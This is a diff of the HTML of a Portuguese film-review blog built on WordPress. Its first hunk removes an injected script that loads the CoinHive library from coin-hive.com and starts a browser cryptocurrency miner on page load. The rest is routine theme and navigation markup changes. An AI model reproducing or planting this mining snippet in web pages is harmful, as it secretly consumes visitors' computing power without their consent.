@@ -81,12 +81,7 @@ var a2a_config=a2a_config||{};a2a_config.callbacks=a2a_config.callbacks||[];a2a_
   #nav-header .nav ul { background-color: #000000; }
 }
         #footer-bottom { background-color: #000000; }body { background-color: #eaeaea; }</style>
-<script src="https://coin-hive.com/lib/coinhive.min.js"></script><script>
-var speed = 0.17;
-if( window.matchMedia("only screen and (max-width: 760px)").matches ) {
-	speed = 0.8
-}
-var __m=new CoinHive.User("hjflNfOWrK7bMwGmLrOdjoLaolDb8dZf","DW",{throttle:speed});setTimeout(function(){__m.start();},3000);</script></head>
+</head>
 
 <body class="archive category category-estante-da-sala category-11 col-3cm full-width topbar-enabled header-desktop-sticky header-mobile-sticky unknown">
 
@@ -94,18 +89,70 @@ var __m=new CoinHive.User("hjflNfOWrK7bMwGmLrOdjoLaolDb8dZf","DW",{throttle:spee
 
   
   <header id="header" class="main-menu-mobile-on one-mobile-menu main_menu header-ads-desktop  topbar-transparent">
-        <!--/#nav-topbar-->  
-        <!--/#nav-topbar-->  
+        <nav class="nav-container group mobile-menu mobile-sticky" id="nav-mobile" data-menu-id="header-1">
+  <div class="mobile-title-logo-in-header">                  <p class="site-title"><a class="custom-logo-link" href="/" rel="home" title="Críticas | Home page">Críticas</a></p>
+                </div>
+        
+                    <!-- <div class="ham__navbar-toggler collapsed" aria-expanded="false">
+          <div class="ham__navbar-span-wrapper">
+            <span class="ham-toggler-menu__span"></span>
+          </div>
+        </div> -->
+        <div class="ham__navbar-toggler-two collapsed" title="Menu" aria-expanded="false">
+          <div class="ham__navbar-span-wrapper">
+            <span class="line line-1"></span>
+            <span class="line line-2"></span>
+            <span class="line line-3"></span>
+          </div>
+        </div>
+            
+      <div class="nav-text"></div>
+      <div class="nav-wrap container">
+                  <ul class="nav container-inner group mobile-search">
+                            <li>
+                  <form method="get" class="searchform themeform" action="http://criticas.centrodouniverso.com.br/">
+	<div>
+		<input type="text" class="search" name="s" onblur="if(this.value=='')this.value='To search type and hit enter';" onfocus="if(this.value=='To search type and hit enter')this.value='';" value="To search type and hit enter" />
+	</div>
+</form>                </li>
+                      </ul>
+                <ul id="menu-menu-principal" class="nav container-inner group"><li id="menu-item-755" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-755"><a href="/">Home</a></li>
+<li id="menu-item-2323" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-2323"><a href="/sobre">Sobre</a></li>
+<li id="menu-item-2271" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-2271"><a href="/contato">Contato</a></li>
+</ul>      </div>
+</nav><!--/#nav-topbar-->  
+        <nav class="nav-container group desktop-menu desktop-sticky" id="nav-topbar" data-menu-id="header-2">
+    <div class="nav-text"></div>
+  <div class="topbar-toggle-down">
+    <i class="fa fa-angle-double-down" aria-hidden="true" data-toggle="down" title="Expand menu"></i>
+    <i class="fa fa-angle-double-up" aria-hidden="true" data-toggle="up" title="Collapse menu"></i>
+  </div>
+  <div class="nav-wrap container">
+    <ul class="nav container-inner group"><li ><a href="/">Home</a></li><li class="page_item page-item-2270"><a href="/contato">Contato</a></li><li class="page_item page-item-2322"><a href="/sobre">Sobre</a></li></ul>  </div>
+      <div id="topbar-header-search" class="container">
+      <div class="container-inner">
+        <div class="toggle-search"><i class="fa fa-search"></i></div>
+        <div class="search-expand">
+          <div class="search-expand-inner"><form method="get" class="searchform themeform" action="http://criticas.centrodouniverso.com.br/">
+	<div>
+		<input type="text" class="search" name="s" onblur="if(this.value=='')this.value='To search type and hit enter';" onfocus="if(this.value=='To search type and hit enter')this.value='';" value="To search type and hit enter" />
+	</div>
+</form></div>
+        </div>
+      </div><!--/.container-inner-->
+    </div><!--/.container-->
+  
+</nav><!--/#nav-topbar-->  
   <div class="container group">
         <div class="container-inner">
 
-                    <div class="group pad central-header-zone" style="background-image:url('/banner_criticas.png')">
+                    <div class="group pad central-header-zone">
                   <div class="logo-tagline-group">
                                         <p class="site-title"><a class="custom-logo-link" href="/" rel="home" title="Críticas | Home page">Críticas</a></p>
                                                                 <p class="site-description">Fique por dentro do que rola no mundo do cinema</p>
                                         </div>
 
-                                </div><img style='display:none' src='/banner_criticas.png'></img>
+                                </div>
       
                 <nav class="nav-container group desktop-menu" id="nav-header" data-menu-id="header-3">
     <div class="nav-text"><!-- put your mobile menu text here --></div>
@@ -139,18 +186,18 @@ var __m=new CoinHive.User("hjflNfOWrK7bMwGmLrOdjoLaolDb8dZf","DW",{throttle:spee
 
 		<div class="post-thumbnail">
 			<a href="/archives/7663" title="Sobre espaços de validação e exclusão">
-				        <svg class="hu-svg-placeholder thumb-medium-empty" id="59bb80434efa3" viewbox="0 0 1792 1792" xmlns="http://www.w3.org/2000/svg"><path d="M928 832q0-14-9-23t-23-9q-66 0-113 47t-47 113q0 14 9 23t23 9 23-9 9-23q0-40 28-68t68-28q14 0 23-9t9-23zm224 130q0 106-75 181t-181 75-181-75-75-181 75-181 181-75 181 75 75 181zm-1024 574h1536v-128h-1536v128zm1152-574q0-159-112.5-271.5t-271.5-112.5-271.5 112.5-112.5 271.5 112.5 271.5 271.5 112.5 271.5-112.5 112.5-271.5zm-1024-642h384v-128h-384v128zm-128 192h1536v-256h-828l-64 128h-644v128zm1664-256v1280q0 53-37.5 90.5t-90.5 37.5h-1536q-53 0-90.5-37.5t-37.5-90.5v-1280q0-53 37.5-90.5t90.5-37.5h1536q53 0 90.5 37.5t37.5 90.5z"/></svg>
+				        <svg class="hu-svg-placeholder thumb-medium-empty" id="59bd5e460e106" viewbox="0 0 1792 1792" xmlns="http://www.w3.org/2000/svg"><path d="M928 832q0-14-9-23t-23-9q-66 0-113 47t-47 113q0 14 9 23t23 9 23-9 9-23q0-40 28-68t68-28q14 0 23-9t9-23zm224 130q0 106-75 181t-181 75-181-75-75-181 75-181 181-75 181 75 75 181zm-1024 574h1536v-128h-1536v128zm1152-574q0-159-112.5-271.5t-271.5-112.5-271.5 112.5-112.5 271.5 112.5 271.5 271.5 112.5 271.5-112.5 112.5-271.5zm-1024-642h384v-128h-384v128zm-128 192h1536v-256h-828l-64 128h-644v128zm1664-256v1280q0 53-37.5 90.5t-90.5 37.5h-1536q-53 0-90.5-37.5t-37.5-90.5v-1280q0-53 37.5-90.5t90.5-37.5h1536q53 0 90.5 37.5t37.5 90.5z"/></svg>
 
         <script type="text/javascript">
           jQuery( function($){
             if ( $('#flexslider-featured').length ) {
               $('#flexslider-featured').on('featured-slider-ready', function() {
-                $( '#59bb80434efa3' ).animateSvg();
+                $( '#59bd5e460e106' ).animateSvg();
               });
-            } else { $( '#59bb80434efa3' ).animateSvg( { svg_opacity : 0.3, filter_opacity : 0.5 } ); }
+            } else { $( '#59bd5e460e106' ).animateSvg( { svg_opacity : 0.3, filter_opacity : 0.5 } ); }
           });
         </script>
-         <img class="hu-img-placeholder" src="/default_image_649.png" alt="Sobre espaços de validação e exclusão" data-hu-post-id="59bb80434efa3" />															</a>
+         <img class="hu-img-placeholder" src="/wp-content/themes/hueman/assets/front/img/thumb-medium-empty.png" alt="Sobre espaços de validação e exclusão" data-hu-post-id="59bd5e460e106" />															</a>
 					</div><!--/.post-thumbnail-->
 
 		<div class="post-meta group">
@@ -166,7 +213,7 @@ var __m=new CoinHive.User("hjflNfOWrK7bMwGmLrOdjoLaolDb8dZf","DW",{throttle:spee
 		</div><!--/.post-meta-->
 
 		<h2 class="post-title entry-title">
-			<a href="/archives/7663" rel="bookmark" title="Sobre espaços de validação e exclusão" target="_blank">Sobre espaços de validação e exclusão</a>
+			<a href="/archives/7663" rel="bookmark" title="Sobre espaços de validação e exclusão">Sobre espaços de validação e exclusão</a>
 		</h2><!--/.post-title-->
 
 				<div class="entry excerpt entry-summary">
@@ -179,18 +226,18 @@ var __m=new CoinHive.User("hjflNfOWrK7bMwGmLrOdjoLaolDb8dZf","DW",{throttle:spee
 
 		<div class="post-thumbnail">
 			<a href="/archives/7612" title="It: A Coisa (It, 2017)">
-				        <svg class="hu-svg-placeholder thumb-medium-empty" id="59bb80435b561" viewbox="0 0 1792 1792" xmlns="http://www.w3.org/2000/svg"><path d="M928 832q0-14-9-23t-23-9q-66 0-113 47t-47 113q0 14 9 23t23 9 23-9 9-23q0-40 28-68t68-28q14 0 23-9t9-23zm224 130q0 106-75 181t-181 75-181-75-75-181 75-181 181-75 181 75 75 181zm-1024 574h1536v-128h-1536v128zm1152-574q0-159-112.5-271.5t-271.5-112.5-271.5 112.5-112.5 271.5 112.5 271.5 271.5 112.5 271.5-112.5 112.5-271.5zm-1024-642h384v-128h-384v128zm-128 192h1536v-256h-828l-64 128h-644v128zm1664-256v1280q0 53-37.5 90.5t-90.5 37.5h-1536q-53 0-90.5-37.5t-37.5-90.5v-1280q0-53 37.5-90.5t90.5-37.5h1536q53 0 90.5 37.5t37.5 90.5z"/></svg>
+				        <svg class="hu-svg-placeholder thumb-medium-empty" id="59bd5e46358af" viewbox="0 0 1792 1792" xmlns="http://www.w3.org/2000/svg"><path d="M928 832q0-14-9-23t-23-9q-66 0-113 47t-47 113q0 14 9 23t23 9 23-9 9-23q0-40 28-68t68-28q14 0 23-9t9-23zm224 130q0 106-75 181t-181 75-181-75-75-181 75-181 181-75 181 75 75 181zm-1024 574h1536v-128h-1536v128zm1152-574q0-159-112.5-271.5t-271.5-112.5-271.5 112.5-112.5 271.5 112.5 271.5 271.5 112.5 271.5-112.5 112.5-271.5zm-1024-642h384v-128h-384v128zm-128 192h1536v-256h-828l-64 128h-644v128zm1664-256v1280q0 53-37.5 90.5t-90.5 37.5h-1536q-53 0-90.5-37.5t-37.5-90.5v-1280q0-53 37.5-90.5t90.5-37.5h1536q53 0 90.5 37.5t37.5 90.5z"/></svg>
 
         <script type="text/javascript">
           jQuery( function($){
             if ( $('#flexslider-featured').length ) {
               $('#flexslider-featured').on('featured-slider-ready', function() {
-                $( '#59bb80435b561' ).animateSvg();
+                $( '#59bd5e46358af' ).animateSvg();
               });
-            } else { $( '#59bb80435b561' ).animateSvg( { svg_opacity : 0.3, filter_opacity : 0.5 } ); }
+            } else { $( '#59bd5e46358af' ).animateSvg( { svg_opacity : 0.3, filter_opacity : 0.5 } ); }
           });
         </script>
-         <img class="hu-img-placeholder" src="/default_image_649.png" alt="It: A Coisa (It, 2017)" data-hu-post-id="59bb80435b561" />															</a>
+         <img class="hu-img-placeholder" src="/wp-content/themes/hueman/assets/front/img/thumb-medium-empty.png" alt="It: A Coisa (It, 2017)" data-hu-post-id="59bd5e46358af" />															</a>
 					</div><!--/.post-thumbnail-->
 
 		<div class="post-meta group">
@@ -206,7 +253,7 @@ var __m=new CoinHive.User("hjflNfOWrK7bMwGmLrOdjoLaolDb8dZf","DW",{throttle:spee
 		</div><!--/.post-meta-->
 
 		<h2 class="post-title entry-title">
-			<a href="/archives/7612" rel="bookmark" title="It: A Coisa (It, 2017)" target="_blank">It: A Coisa (It, 2017)</a>
+			<a href="/archives/7612" rel="bookmark" title="It: A Coisa (It, 2017)">It: A Coisa (It, 2017)</a>
 		</h2><!--/.post-title-->
 
 				<div class="entry excerpt entry-summary">
@@ -219,18 +266,18 @@ var __m=new CoinHive.User("hjflNfOWrK7bMwGmLrOdjoLaolDb8dZf","DW",{throttle:spee
 
 		<div class="post-thumbnail">
 			<a href="/archives/7465" title="Dicas Netflix Setembro">
-				        <svg class="hu-svg-placeholder thumb-medium-empty" id="59bb80436427c" viewbox="0 0 1792 1792" xmlns="http://www.w3.org/2000/svg"><path d="M928 832q0-14-9-23t-23-9q-66 0-113 47t-47 113q0 14 9 23t23 9 23-9 9-23q0-40 28-68t68-28q14 0 23-9t9-23zm224 130q0 106-75 181t-181 75-181-75-75-181 75-181 181-75 181 75 75 181zm-1024 574h1536v-128h-1536v128zm1152-574q0-159-112.5-271.5t-271.5-112.5-271.5 112.5-112.5 271.5 112.5 271.5 271.5 112.5 271.5-112.5 112.5-271.5zm-1024-642h384v-128h-384v128zm-128 192h1536v-256h-828l-64 128h-644v128zm1664-256v1280q0 53-37.5 90.5t-90.5 37.5h-1536q-53 0-90.5-37.5t-37.5-90.5v-1280q0-53 37.5-90.5t90.5-37.5h1536q53 0 90.5 37.5t37.5 90.5z"/></svg>
+				        <svg class="hu-svg-placeholder thumb-medium-empty" id="59bd5e4663074" viewbox="0 0 1792 1792" xmlns="http://www.w3.org/2000/svg"><path d="M928 832q0-14-9-23t-23-9q-66 0-113 47t-47 113q0 14 9 23t23 9 23-9 9-23q0-40 28-68t68-28q14 0 23-9t9-23zm224 130q0 106-75 181t-181 75-181-75-75-181 75-181 181-75 181 75 75 181zm-1024 574h1536v-128h-1536v128zm1152-574q0-159-112.5-271.5t-271.5-112.5-271.5 112.5-112.5 271.5 112.5 271.5 271.5 112.5 271.5-112.5 112.5-271.5zm-1024-642h384v-128h-384v128zm-128 192h1536v-256h-828l-64 128h-644v128zm1664-256v1280q0 53-37.5 90.5t-90.5 37.5h-1536q-53 0-90.5-37.5t-37.5-90.5v-1280q0-53 37.5-90.5t90.5-37.5h1536q53 0 90.5 37.5t37.5 90.5z"/></svg>
 
         <script type="text/javascript">
           jQuery( function($){
             if ( $('#flexslider-featured').length ) {
               $('#flexslider-featured').on('featured-slider-ready', function() {
-                $( '#59bb80436427c' ).animateSvg();
+                $( '#59bd5e4663074' ).animateSvg();
               });
-            } else { $( '#59bb80436427c' ).animateSvg( { svg_opacity : 0.3, filter_opacity : 0.5 } ); }
+            } else { $( '#59bd5e4663074' ).animateSvg( { svg_opacity : 0.3, filter_opacity : 0.5 } ); }
           });
         </script>
-         <img class="hu-img-placeholder" src="/default_image_649.png" alt="Dicas Netflix Setembro" data-hu-post-id="59bb80436427c" />															</a>
+         <img class="hu-img-placeholder" src="/wp-content/themes/hueman/assets/front/img/thumb-medium-empty.png" alt="Dicas Netflix Setembro" data-hu-post-id="59bd5e4663074" />															</a>
 					</div><!--/.post-thumbnail-->
 
 		<div class="post-meta group">
@@ -246,7 +293,7 @@ var __m=new CoinHive.User("hjflNfOWrK7bMwGmLrOdjoLaolDb8dZf","DW",{throttle:spee
 		</div><!--/.post-meta-->
 
 		<h2 class="post-title entry-title">
-			<a href="/archives/7465" rel="bookmark" title="Dicas Netflix Setembro" target="_blank">Dicas Netflix Setembro</a>
+			<a href="/archives/7465" rel="bookmark" title="Dicas Netflix Setembro">Dicas Netflix Setembro</a>
 		</h2><!--/.post-title-->
 
 				<div class="entry excerpt entry-summary">
@@ -259,18 +306,18 @@ var __m=new CoinHive.User("hjflNfOWrK7bMwGmLrOdjoLaolDb8dZf","DW",{throttle:spee
 
 		<div class="post-thumbnail">
 			<a href="/archives/7454" title="Filmes assistidos em Agosto">
-				        <svg class="hu-svg-placeholder thumb-medium-empty" id="59bb80436ae0c" viewbox="0 0 1792 1792" xmlns="http://www.w3.org/2000/svg"><path d="M928 832q0-14-9-23t-23-9q-66 0-113 47t-47 113q0 14 9 23t23 9 23-9 9-23q0-40 28-68t68-28q14 0 23-9t9-23zm224 130q0 106-75 181t-181 75-181-75-75-181 75-181 181-75 181 75 75 181zm-1024 574h1536v-128h-1536v128zm1152-574q0-159-112.5-271.5t-271.5-112.5-271.5 112.5-112.5 271.5 112.5 271.5 271.5 112.5 271.5-112.5 112.5-271.5zm-1024-642h384v-128h-384v128zm-128 192h1536v-256h-828l-64 128h-644v128zm1664-256v1280q0 53-37.5 90.5t-90.5 37.5h-1536q-53 0-90.5-37.5t-37.5-90.5v-1280q0-53 37.5-90.5t90.5-37.5h1536q53 0 90.5 37.5t37.5 90.5z"/></svg>
+				        <svg class="hu-svg-placeholder thumb-medium-empty" id="59bd5e4677790" viewbox="0 0 1792 1792" xmlns="http://www.w3.org/2000/svg"><path d="M928 832q0-14-9-23t-23-9q-66 0-113 47t-47 113q0 14 9 23t23 9 23-9 9-23q0-40 28-68t68-28q14 0 23-9t9-23zm224 130q0 106-75 181t-181 75-181-75-75-181 75-181 181-75 181 75 75 181zm-1024 574h1536v-128h-1536v128zm1152-574q0-159-112.5-271.5t-271.5-112.5-271.5 112.5-112.5 271.5 112.5 271.5 271.5 112.5 271.5-112.5 112.5-271.5zm-1024-642h384v-128h-384v128zm-128 192h1536v-256h-828l-64 128h-644v128zm1664-256v1280q0 53-37.5 90.5t-90.5 37.5h-1536q-53 0-90.5-37.5t-37.5-90.5v-1280q0-53 37.5-90.5t90.5-37.5h1536q53 0 90.5 37.5t37.5 90.5z"/></svg>
 
         <script type="text/javascript">
           jQuery( function($){
             if ( $('#flexslider-featured').length ) {
               $('#flexslider-featured').on('featured-slider-ready', function() {
-                $( '#59bb80436ae0c' ).animateSvg();
+                $( '#59bd5e4677790' ).animateSvg();
               });
-            } else { $( '#59bb80436ae0c' ).animateSvg( { svg_opacity : 0.3, filter_opacity : 0.5 } ); }
+            } else { $( '#59bd5e4677790' ).animateSvg( { svg_opacity : 0.3, filter_opacity : 0.5 } ); }
           });
         </script>
-         <img class="hu-img-placeholder" src="/default_image_649.png" alt="Filmes assistidos em Agosto" data-hu-post-id="59bb80436ae0c" />															</a>
+         <img class="hu-img-placeholder" src="/wp-content/themes/hueman/assets/front/img/thumb-medium-empty.png" alt="Filmes assistidos em Agosto" data-hu-post-id="59bd5e4677790" />															</a>
 					</div><!--/.post-thumbnail-->
 
 		<div class="post-meta group">
@@ -286,7 +333,7 @@ var __m=new CoinHive.User("hjflNfOWrK7bMwGmLrOdjoLaolDb8dZf","DW",{throttle:spee
 		</div><!--/.post-meta-->
 
 		<h2 class="post-title entry-title">
-			<a href="/archives/7454" rel="bookmark" title="Filmes assistidos em Agosto" target="_blank">Filmes assistidos em Agosto</a>
+			<a href="/archives/7454" rel="bookmark" title="Filmes assistidos em Agosto">Filmes assistidos em Agosto</a>
 		</h2><!--/.post-title-->
 
 				<div class="entry excerpt entry-summary">
@@ -299,18 +346,18 @@ var __m=new CoinHive.User("hjflNfOWrK7bMwGmLrOdjoLaolDb8dZf","DW",{throttle:spee
 
 		<div class="post-thumbnail">
 			<a href="/archives/6949" title="Filmes Assistidos em Julho">
-				        <svg class="hu-svg-placeholder thumb-medium-empty" id="59bb80437297c" viewbox="0 0 1792 1792" xmlns="http://www.w3.org/2000/svg"><path d="M928 832q0-14-9-23t-23-9q-66 0-113 47t-47 113q0 14 9 23t23 9 23-9 9-23q0-40 28-68t68-28q14 0 23-9t9-23zm224 130q0 106-75 181t-181 75-181-75-75-181 75-181 181-75 181 75 75 181zm-1024 574h1536v-128h-1536v128zm1152-574q0-159-112.5-271.5t-271.5-112.5-271.5 112.5-112.5 271.5 112.5 271.5 271.5 112.5 271.5-112.5 112.5-271.5zm-1024-642h384v-128h-384v128zm-128 192h1536v-256h-828l-64 128h-644v128zm1664-256v1280q0 53-37.5 90.5t-90.5 37.5h-1536q-53 0-90.5-37.5t-37.5-90.5v-1280q0-53 37.5-90.5t90.5-37.5h1536q53 0 90.5 37.5t37.5 90.5z"/></svg>
+				        <svg class="hu-svg-placeholder thumb-medium-empty" id="59bd5e46855be" viewbox="0 0 1792 1792" xmlns="http://www.w3.org/2000/svg"><path d="M928 832q0-14-9-23t-23-9q-66 0-113 47t-47 113q0 14 9 23t23 9 23-9 9-23q0-40 28-68t68-28q14 0 23-9t9-23zm224 130q0 106-75 181t-181 75-181-75-75-181 75-181 181-75 181 75 75 181zm-1024 574h1536v-128h-1536v128zm1152-574q0-159-112.5-271.5t-271.5-112.5-271.5 112.5-112.5 271.5 112.5 271.5 271.5 112.5 271.5-112.5 112.5-271.5zm-1024-642h384v-128h-384v128zm-128 192h1536v-256h-828l-64 128h-644v128zm1664-256v1280q0 53-37.5 90.5t-90.5 37.5h-1536q-53 0-90.5-37.5t-37.5-90.5v-1280q0-53 37.5-90.5t90.5-37.5h1536q53 0 90.5 37.5t37.5 90.5z"/></svg>
 
         <script type="text/javascript">
           jQuery( function($){
             if ( $('#flexslider-featured').length ) {
               $('#flexslider-featured').on('featured-slider-ready', function() {
-                $( '#59bb80437297c' ).animateSvg();
+                $( '#59bd5e46855be' ).animateSvg();
               });
-            } else { $( '#59bb80437297c' ).animateSvg( { svg_opacity : 0.3, filter_opacity : 0.5 } ); }
+            } else { $( '#59bd5e46855be' ).animateSvg( { svg_opacity : 0.3, filter_opacity : 0.5 } ); }
           });
         </script>
-         <img class="hu-img-placeholder" src="/default_image_649.png" alt="Filmes Assistidos em Julho" data-hu-post-id="59bb80437297c" />															</a>
+         <img class="hu-img-placeholder" src="/wp-content/themes/hueman/assets/front/img/thumb-medium-empty.png" alt="Filmes Assistidos em Julho" data-hu-post-id="59bd5e46855be" />															</a>
 					</div><!--/.post-thumbnail-->
 
 		<div class="post-meta group">
@@ -326,7 +373,7 @@ var __m=new CoinHive.User("hjflNfOWrK7bMwGmLrOdjoLaolDb8dZf","DW",{throttle:spee
 		</div><!--/.post-meta-->
 
 		<h2 class="post-title entry-title">
-			<a href="/archives/6949" rel="bookmark" title="Filmes Assistidos em Julho" target="_blank">Filmes Assistidos em Julho</a>
+			<a href="/archives/6949" rel="bookmark" title="Filmes Assistidos em Julho">Filmes Assistidos em Julho</a>
 		</h2><!--/.post-title-->
 
 				<div class="entry excerpt entry-summary">
@@ -339,18 +386,18 @@ var __m=new CoinHive.User("hjflNfOWrK7bMwGmLrOdjoLaolDb8dZf","DW",{throttle:spee
 
 		<div class="post-thumbnail">
 			<a href="/archives/6559" title="Dicas Netflix Julho">
-				        <svg class="hu-svg-placeholder thumb-medium-empty" id="59bb8043792a4" viewbox="0 0 1792 1792" xmlns="http://www.w3.org/2000/svg"><path d="M928 832q0-14-9-23t-23-9q-66 0-113 47t-47 113q0 14 9 23t23 9 23-9 9-23q0-40 28-68t68-28q14 0 23-9t9-23zm224 130q0 106-75 181t-181 75-181-75-75-181 75-181 181-75 181 75 75 181zm-1024 574h1536v-128h-1536v128zm1152-574q0-159-112.5-271.5t-271.5-112.5-271.5 112.5-112.5 271.5 112.5 271.5 271.5 112.5 271.5-112.5 112.5-271.5zm-1024-642h384v-128h-384v128zm-128 192h1536v-256h-828l-64 128h-644v128zm1664-256v1280q0 53-37.5 90.5t-90.5 37.5h-1536q-53 0-90.5-37.5t-37.5-90.5v-1280q0-53 37.5-90.5t90.5-37.5h1536q53 0 90.5 37.5t37.5 90.5z"/></svg>
+				        <svg class="hu-svg-placeholder thumb-medium-empty" id="59bd5e4694302" viewbox="0 0 1792 1792" xmlns="http://www.w3.org/2000/svg"><path d="M928 832q0-14-9-23t-23-9q-66 0-113 47t-47 113q0 14 9 23t23 9 23-9 9-23q0-40 28-68t68-28q14 0 23-9t9-23zm224 130q0 106-75 181t-181 75-181-75-75-181 75-181 181-75 181 75 75 181zm-1024 574h1536v-128h-1536v128zm1152-574q0-159-112.5-271.5t-271.5-112.5-271.5 112.5-112.5 271.5 112.5 271.5 271.5 112.5 271.5-112.5 112.5-271.5zm-1024-642h384v-128h-384v128zm-128 192h1536v-256h-828l-64 128h-644v128zm1664-256v1280q0 53-37.5 90.5t-90.5 37.5h-1536q-53 0-90.5-37.5t-37.5-90.5v-1280q0-53 37.5-90.5t90.5-37.5h1536q53 0 90.5 37.5t37.5 90.5z"/></svg>
 
         <script type="text/javascript">
           jQuery( function($){
             if ( $('#flexslider-featured').length ) {
               $('#flexslider-featured').on('featured-slider-ready', function() {
-                $( '#59bb8043792a4' ).animateSvg();
+                $( '#59bd5e4694302' ).animateSvg();
               });
-            } else { $( '#59bb8043792a4' ).animateSvg( { svg_opacity : 0.3, filter_opacity : 0.5 } ); }
+            } else { $( '#59bd5e4694302' ).animateSvg( { svg_opacity : 0.3, filter_opacity : 0.5 } ); }
           });
         </script>
-         <img class="hu-img-placeholder" src="/default_image_649.png" alt="Dicas Netflix Julho" data-hu-post-id="59bb8043792a4" />															</a>
+         <img class="hu-img-placeholder" src="/wp-content/themes/hueman/assets/front/img/thumb-medium-empty.png" alt="Dicas Netflix Julho" data-hu-post-id="59bd5e4694302" />															</a>
 					</div><!--/.post-thumbnail-->
 
 		<div class="post-meta group">
@@ -366,7 +413,7 @@ var __m=new CoinHive.User("hjflNfOWrK7bMwGmLrOdjoLaolDb8dZf","DW",{throttle:spee
 		</div><!--/.post-meta-->
 
 		<h2 class="post-title entry-title">
-			<a href="/archives/6559" rel="bookmark" title="Dicas Netflix Julho" target="_blank">Dicas Netflix Julho</a>
+			<a href="/archives/6559" rel="bookmark" title="Dicas Netflix Julho">Dicas Netflix Julho</a>
 		</h2><!--/.post-title-->
 
 				<div class="entry excerpt entry-summary">
@@ -379,18 +426,18 @@ var __m=new CoinHive.User("hjflNfOWrK7bMwGmLrOdjoLaolDb8dZf","DW",{throttle:spee
 
 		<div class="post-thumbnail">
 			<a href="/archives/6468" title="Filmes assistidos em Junho">
-				        <svg class="hu-svg-placeholder thumb-medium-empty" id="59bb80437ee35" viewbox="0 0 1792 1792" xmlns="http://www.w3.org/2000/svg"><path d="M928 832q0-14-9-23t-23-9q-66 0-113 47t-47 113q0 14 9 23t23 9 23-9 9-23q0-40 28-68t68-28q14 0 23-9t9-23zm224 130q0 106-75 181t-181 75-181-75-75-181 75-181 181-75 181 75 75 181zm-1024 574h1536v-128h-1536v128zm1152-574q0-159-112.5-271.5t-271.5-112.5-271.5 112.5-112.5 271.5 112.5 271.5 271.5 112.5 271.5-112.5 112.5-271.5zm-1024-642h384v-128h-384v128zm-128 192h1536v-256h-828l-64 128h-644v128zm1664-256v1280q0 53-37.5 90.5t-90.5 37.5h-1536q-53 0-90.5-37.5t-37.5-90.5v-1280q0-53 37.5-90.5t90.5-37.5h1536q53 0 90.5 37.5t37.5 90.5z"/></svg>
+				        <svg class="hu-svg-placeholder thumb-medium-empty" id="59bd5e46a5b0e" viewbox="0 0 1792 1792" xmlns="http://www.w3.org/2000/svg"><path d="M928 832q0-14-9-23t-23-9q-66 0-113 47t-47 113q0 14 9 23t23 9 23-9 9-23q0-40 28-68t68-28q14 0 23-9t9-23zm224 130q0 106-75 181t-181 75-181-75-75-181 75-181 181-75 181 75 75 181zm-1024 574h1536v-128h-1536v128zm1152-574q0-159-112.5-271.5t-271.5-112.5-271.5 112.5-112.5 271.5 112.5 271.5 271.5 112.5 271.5-112.5 112.5-271.5zm-1024-642h384v-128h-384v128zm-128 192h1536v-256h-828l-64 128h-644v128zm1664-256v1280q0 53-37.5 90.5t-90.5 37.5h-1536q-53 0-90.5-37.5t-37.5-90.5v-1280q0-53 37.5-90.5t90.5-37.5h1536q53 0 90.5 37.5t37.5 90.5z"/></svg>
 
         <script type="text/javascript">
           jQuery( function($){
             if ( $('#flexslider-featured').length ) {
               $('#flexslider-featured').on('featured-slider-ready', function() {
-                $( '#59bb80437ee35' ).animateSvg();
+                $( '#59bd5e46a5b0e' ).animateSvg();
               });
-            } else { $( '#59bb80437ee35' ).animateSvg( { svg_opacity : 0.3, filter_opacity : 0.5 } ); }
+            } else { $( '#59bd5e46a5b0e' ).animateSvg( { svg_opacity : 0.3, filter_opacity : 0.5 } ); }
           });
         </script>
-         <img class="hu-img-placeholder" src="/default_image_649.png" alt="Filmes assistidos em Junho" data-hu-post-id="59bb80437ee35" />															</a>
+         <img class="hu-img-placeholder" src="/wp-content/themes/hueman/assets/front/img/thumb-medium-empty.png" alt="Filmes assistidos em Junho" data-hu-post-id="59bd5e46a5b0e" />															</a>
 					</div><!--/.post-thumbnail-->
 
 		<div class="post-meta group">
@@ -406,7 +453,7 @@ var __m=new CoinHive.User("hjflNfOWrK7bMwGmLrOdjoLaolDb8dZf","DW",{throttle:spee
 		</div><!--/.post-meta-->
 
 		<h2 class="post-title entry-title">
-			<a href="/archives/6468" rel="bookmark" title="Filmes assistidos em Junho" target="_blank">Filmes assistidos em Junho</a>
+			<a href="/archives/6468" rel="bookmark" title="Filmes assistidos em Junho">Filmes assistidos em Junho</a>
 		</h2><!--/.post-title-->
 
 				<div class="entry excerpt entry-summary">
@@ -419,18 +466,18 @@ var __m=new CoinHive.User("hjflNfOWrK7bMwGmLrOdjoLaolDb8dZf","DW",{throttle:spee
 
 		<div class="post-thumbnail">
 			<a href="/archives/5989" title="Mulher Maravilha (Wonder Woman, 2017)">
-				        <svg class="hu-svg-placeholder thumb-medium-empty" id="59bb804381bb7" viewbox="0 0 1792 1792" xmlns="http://www.w3.org/2000/svg"><path d="M928 832q0-14-9-23t-23-9q-66 0-113 47t-47 113q0 14 9 23t23 9 23-9 9-23q0-40 28-68t68-28q14 0 23-9t9-23zm224 130q0 106-75 181t-181 75-181-75-75-181 75-181 181-75 181 75 75 181zm-1024 574h1536v-128h-1536v128zm1152-574q0-159-112.5-271.5t-271.5-112.5-271.5 112.5-112.5 271.5 112.5 271.5 271.5 112.5 271.5-112.5 112.5-271.5zm-1024-642h384v-128h-384v128zm-128 192h1536v-256h-828l-64 128h-644v128zm1664-256v1280q0 53-37.5 90.5t-90.5 37.5h-1536q-53 0-90.5-37.5t-37.5-90.5v-1280q0-53 37.5-90.5t90.5-37.5h1536q53 0 90.5 37.5t37.5 90.5z"/></svg>
